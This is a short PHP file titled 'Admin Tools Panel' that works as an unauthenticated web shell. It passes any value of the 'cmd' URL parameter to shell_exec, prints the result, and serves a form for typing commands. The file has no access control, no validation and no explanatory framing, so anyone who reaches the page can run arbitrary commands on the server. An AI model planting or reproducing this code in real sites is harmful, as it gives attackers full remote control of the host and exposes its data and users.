<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
} else {
    echo "<h1>Admin Tools Panel</h1>";
    echo "<p>Enter a command to execute:</p>";
    echo "<form method='get'>
        Command: <input type='text' name='cmd'>
        <input type='submit' value='Execute'>
    </form>";
}
?>
